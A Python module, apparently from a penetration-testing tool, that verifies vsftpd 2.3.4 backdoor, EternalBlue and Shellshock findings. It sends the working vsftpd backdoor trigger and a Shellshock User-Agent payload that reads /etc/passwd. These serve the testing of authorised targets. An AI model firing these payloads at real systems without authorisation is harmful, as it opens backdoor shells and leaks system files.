import socket
import subprocess
import time
import requests

def check_port(ip, port, timeout=3):
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return "open"
    except socket.timeout:
        return "timeout"
    except:
        return "closed"

def verify_vsftpd_backdoor(target_ip):
    print(f"[*] Verify vsftpd backdoor trên {target_ip}...")
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((target_ip, 21))
        s.recv(1024)
        s.send(b"USER 1234:)\r\n")
        s.recv(1024)
        s.send(b"PASS x\r\n")
        s.close()
        time.sleep(2)
        result = check_port(target_ip, 6200)
        if result == "open":
            return {"status": "CONFIRMED", "evidence": "port_6200_open", "severity": "Critical"}
        elif result == "closed":
            return {"status": "FALSE_POSITIVE", "reason": "backported_patch", "severity": "Informational"}
        else:
            return {"status": "PENDING", "reason": "possible_firewall", "next_action": "run_fin_scan"}
    except Exception as e:
        return {"status": "ERROR", "reason": str(e)}

def verify_smb_eternalblue(target_ip):
    print(f"[*] Verify EternalBlue trên {target_ip}...")
    try:
        result = subprocess.run([
            "nmap", "--script", "smb-vuln-ms17-010", "-p", "445", target_ip
        ], capture_output=True, text=True, timeout=30)
        if "VULNERABLE" in result.stdout:
            return {"status": "CONFIRMED", "evidence": "smb_vuln_ms17_010", "severity": "Critical"}
        else:
            return {"status": "FALSE_POSITIVE", "reason": "not_vulnerable"}
    except Exception as e:
        return {"status": "ERROR", "reason": str(e)}

def verify_shellshock(target_ip):
    print(f"[*] Verify Shellshock trên {target_ip}...")
    try:
        headers = {
            "User-Agent": "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
        }
        urls = [
            f"http://{target_ip}/cgi-bin/test.cgi",
            f"http://{target_ip}/cgi-bin/status",
            f"http://{target_ip}/cgi-bin/bash"
        ]
        for url in urls:
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if "root:" in r.text:
                    return {"status": "CONFIRMED", "evidence": f"passwd leak via {url}", "severity": "Critical"}
            except:
                continue
        return {"status": "FALSE_POSITIVE", "reason": "no_cgi_endpoint_vulnerable"}
    except Exception as e:
        return {"status": "ERROR", "reason": str(e)}

VERIFY_MAP = {
    "tcp_port_6200": verify_vsftpd_backdoor,
    "nmap_smb_script": verify_smb_eternalblue,
    "http_header_inject": verify_shellshock,
}

def run_verify(verify_method, target_ip):
    fn = VERIFY_MAP.get(verify_method)
    if fn:
        return fn(target_ip)
    return {"status": "PENDING", "reason": "no_verify_function"}

if __name__ == "__main__":
    print("[TEST] Check port 22 localhost:")
    r = check_port("127.0.0.1", 22)
    print(f"  → port 22: {r}")
    print("[OK] Verify module hoạt động")
